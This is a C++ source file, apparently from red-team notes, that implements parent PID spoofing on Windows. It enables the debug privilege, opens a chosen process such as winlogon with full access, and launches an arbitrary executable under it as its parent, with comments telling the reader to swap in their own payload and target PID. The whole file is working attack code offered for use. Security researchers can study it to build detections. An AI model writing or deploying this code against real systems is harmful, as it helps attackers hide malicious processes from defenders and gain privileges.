/*
* Title: Parent PID Spoofing
* Resources:
*	- https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/privilege-escalation/t1134-access-token-manipulation/parent-pid-spoofing
*/
#include <Windows.h>
#include <iostream>

BOOL AdjustCurrentProcessToken() {
	HANDLE hToken = nullptr;

	if (!OpenProcessToken(GetCurrentProcessToken(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return FALSE;

	TOKEN_PRIVILEGES tp = {};
	if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &tp.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return FALSE;
	}
	
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, 0, &tp, sizeof(tp), nullptr, nullptr)) {
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);

	return TRUE;
}

BOOL PPIDSpoofing() {
	LPCWSTR lpPayload = L"C:\\Windows\\System32\\calc.exe"; // Replace it with your own executable.
	DWORD dwPid = 7328; // Replace it with the target PID that you want to use as parent process (e.g. winlogon).

	// Initialize an attribute list.
	SIZE_T dwAttributeListSize = 0;
	InitializeProcThreadAttributeList(nullptr, 1, 0, &dwAttributeListSize);
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, dwAttributeListSize);
	if (!pAttributeList)
		return FALSE;
	if (!InitializeProcThreadAttributeList(pAttributeList, 1, 0, &dwAttributeListSize)) {
		DeleteProcThreadAttributeList(pAttributeList);
		return FALSE;
	}

	AdjustCurrentProcessToken();

	HANDLE hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hParentProcess) {
		DeleteProcThreadAttributeList(pAttributeList);
		return FALSE;
	}
	if (!UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), nullptr, nullptr)) {
		CloseHandle(hParentProcess);
		DeleteProcThreadAttributeList(pAttributeList);
		return FALSE;
	}

	STARTUPINFOEX si = {sizeof(si)};
	si.StartupInfo.cb = sizeof(STARTUPINFOEX);
	si.lpAttributeList = pAttributeList;

	PROCESS_INFORMATION pi = {};
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	if (!CreateProcess(
		nullptr,
		const_cast<LPWSTR>(lpPayload),
		nullptr,
		nullptr,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT,
		nullptr,
		nullptr,
		&si.StartupInfo,
		&pi
	)) {
		CloseHandle(hParentProcess);
		DeleteProcThreadAttributeList(pAttributeList);
		return FALSE;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);

	CloseHandle(hParentProcess);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	DeleteProcThreadAttributeList(pAttributeList);

	return TRUE;
}
